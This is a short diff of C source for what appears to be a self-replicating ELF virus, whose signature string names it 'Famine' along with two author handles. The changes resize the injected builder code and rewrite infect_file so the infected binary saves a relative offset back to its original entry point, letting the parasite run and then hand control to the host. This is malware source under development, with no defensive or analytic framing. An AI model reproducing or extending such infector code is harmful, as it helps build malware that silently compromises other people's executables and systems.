@@ -8,7 +8,7 @@
 #include <sys/mman.h>
 #include <sys/syscall.h>
 
-#define BUILDER_SIZE 0x13a;
+#define BUILDER_SIZE 0x151;
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
 // Structs
@@ -266,7 +266,8 @@ infect_file(volatile char *path, volatile file *file_self) {
     uint64_t *target_scaffold_start_offset = file_target.mem + builder_target_start_offset + builder_self_size - 16;
     uint64_t *target_scaffold_num = file_target.mem + builder_target_start_offset + builder_self_size - 8;
 
-    *target_old_entry = header_target->e_entry;
+    uint64_t old_entry_diff = builder_target_start_offset + 0xe5 - addr_to_offset(&file_target, header_target->e_entry);
+    *target_old_entry = old_entry_diff;
     *target_scaffold_start_offset = scaffolt_target_start_offset;
     *target_scaffold_num = scaffold_target_size;
 
